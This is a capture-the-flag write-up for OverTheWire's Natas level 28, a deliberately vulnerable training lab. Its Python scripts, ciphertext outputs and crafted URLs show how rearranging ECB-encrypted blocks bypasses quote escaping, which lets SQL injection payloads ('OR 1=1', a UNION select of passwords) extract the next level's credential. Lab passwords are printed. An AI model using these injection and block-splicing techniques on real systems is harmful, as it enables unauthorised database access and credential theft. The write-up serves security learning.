# Level 28

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas28.natas.labs.overthewire.org](http://natas28.natas.labs.overthewire.org)
- username: `natas28`
- password: `skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4`

## Solution

![start](./start.jpg)

By interacting with the page we can notice, that along with the results, also there will be some search parameter `query` in URL *(for example searching for `a`)*:

[http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D](http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D)

![search](./search.jpg)

Let's write simple python script to interact with the website to get only those search queries in url-decoded form to analyze them based on the amount of letters to search *(`a`, `aa`, `aaa`...)*:

```py
import requests
import urllib.parse

# Base URL
url = 'http://natas28.natas.labs.overthewire.org'

# Function to make a POST request and get the redirected URL and response
def send_post_request(query):

    # Our parameters
    params = dict(query=query)
    
    headers = {
        'Authorization': 'Basic bmF0YXMyODpza3J3eGNpQWU2RG5iMFZmRkR6REVIY0N6UW12M0dkNA==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas28.natas.labs.overthewire.org',
        'Referer': 'http://natas28.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the POST request with params
    response = requests.post(url, headers=headers, params=params)

    # Extract the query part from the URL
    parsed_url = urllib.parse.urlparse(response.url)
    query_value = urllib.parse.parse_qs(parsed_url.query)['query'][0]

    # URL decode the extracted query part
    decoded_query = urllib.parse.unquote(query_value)
    
    return decoded_query

# send 1 to 20 a's
for i in range(1,21):
    decoded_query = send_post_request("a" * i)
    print(f"{i:02d}: {decoded_query}")
```

Output:

```
01: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
02: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
03: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
04: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI1BKmpZ1/9YUtPH5DShPyqKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
05: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLDah8EaRWKMFIWYUal4/LsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
06: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJKEf/nOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
07: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKf3hzvbj+EoXJjPzB0/I4YZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
08: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
09: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
10: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
11: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
12: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
13: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
14: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
15: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo/rTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
16: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiSUVjPxawG0iv9oLcsjxUad+jtGqvgtdBcT/5qwUI6tHjrGh/iYaLGwVBhEJs/7a
17: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OerfihrQF37R7K06x8EIKqnr36EFTsaFFc+W8qVURZGUeQT0sqvywtdoaqcqUxUclw
18: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeU9lJnrytaGHwS3zcJPMEYkh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
19: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepUn9pSttm04mMtsxg4hW1ZouK1228x8ZoU91Z46tqpBCSbk+TeoJCUeZlbnESzUa
20: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeIBG75Ijd4bvslhthcLMOEikofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
```

We can see, that the beginning is equal for all the requests:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
```

Also by removing some characters from the `query` parameter we can cause this error:

![error](./error.jpg)

So by googling it, and seeing identical parts in different request we can assumme, that it will be [Electronic Code Book](https://book.hacktricks.xyz/crypto-and-stego/electronic-code-book-ecb) *(Electronic Code Book - symmetric encryption scheme which replaces each block of the clear text by the block of ciphertext. It is the simplest encryption scheme.)*. From this source we can understand that we can move the blocks. Now we need to understand what each block means.

If we change our code to send `ASCII` lowercase letters:

```py
for i in (string.ascii_lowercase):
    decoded_query = send_post_request(i)
    print(f"{i}: {decoded_query}")
```

Output:

```py
a: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
b: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIYiwNnSJY7KHJGU+XjuMzVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
c: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKEMZKNASy09t5ooTNAbaX0vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
```

We can note one more thing, that the last part of the output are also the same *(It probably depends on the string length)*, so let's try to find the block size *(From our initial output)*:

![analysis](./analysis.jpg)

- The red square is identical by all lengths of requests
- The pink square is identical for all requests with length >= 10

So by base64 decoding the pink part in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Count_occurrences(%7B'option':'Regex','string':'.'%7D)&input=SmZJcWNuOWlWQm1rWnZtdlU0a2ZteQ) and counting the characters we can see, that the block length (probably?) will be 16 characters:

![block](./block.jpg)

By changing our code to:

```py
for i in (string.printable):
    decoded_query = send_post_request(i)
    print(f"{i}: {decoded_query}")
```

We can see something unusual:

```
0: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIZVmxvtq+NhSBxG1ShKyNOvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
1: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLP9baIk2Ue8NLFHkisvCsovfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
2: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJKsqxhd1u8TdA/TD8pKcZ3vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
3: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLwHgMX39QP8kCLRhrAhHsBvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
...
": G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIFJJdk81Qbm5onM4n5XT7DSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
...
': G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK2m1Dlc2qtE8XWPmhO77spSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
...
\: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI6vxUwqCFATEVQds2XgPcMSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
...
```

The characters `"`, `\` and `'` have different ending, that's because they probably got escaped *(Our assumption that the last part has something with string length was correct)*! As we also know, that it takes 10 characters to change the next block *(pink square)* we can start to build our payload with following parts:

1. Start blocks *(red square)*
2. Block of 10 space characters decoded *(To get rid of escaping character)*
3. Payload

Basically what will be done:

`aaaaaaaaa'` will be transformed to `aaaaaaaaa\'`, so to inject `' OR 1=1 -- ` we need to replace `aaaaaaaaa\` block with block of 10 spaces.

Let's adjust our script to make it:

```py
decoded_query = send_post_request("aaaaaaaaa' OR 1=1 -- ")
print(decoded_query)
```

Output:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
```

The start blocks will be `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP`.
Block of 10 space characters will be `ItlMM3qTizkRB5P2zYxJsb`. *(Not from this output)*
Payload = `output` - `start blocks` - `bad value`

Our bad value is:

```py
decoded_query = send_post_request("aaaaaaaaa'")
print(decoded_query)
```

Output:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOstdkbwCSkbjZzJR1FrozncqM9OYQkTq645oGdhkgSlo=
```

So the bad value is `IR27gK4CQl3Jcmv/0YAxYO`

Then our payload will be `WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K`

Let's reconstruct now the full request parameter:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
```

Now we need to URL-encode it:

![url-encode](./url-encode.jpg)

And send to server:

[http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK](http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK)

![work](./work.jpg)

Great! It works!

Based on the previous challenges we can assume, that we need to extract `password` from the table `users`. Let's build our new payload:

```py
decoded_query = send_post_request("aaaaaaaaa' union select password from users -- ")
print(decoded_query)
```

Output:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYO+J3Y2+wVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kZy+exMySI3M79Oa4mUCUQ/p36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
```

Also we need to remove block of bad value `aaaaaaaaa'` and insert block of 10 spaces `ItlMM3qTizkRB5P2zYxJsb`:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb+J3Y2+wVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kZy+exMySI3M79Oa4mUCUQ/p36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
```

Again URL-encode it and send to server:

[http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2BJ3Y2%2BwVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kZy%2BexMySI3M79Oa4mUCUQ%2Fp36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D](http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2BJ3Y2%2BwVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kZy%2BexMySI3M79Oa4mUCUQ%2Fp36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D)

![pass](./pass.jpg)


## Password

`natas29`:`pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno`

*Created by [bu19akov](https://github.com/bu19akov)*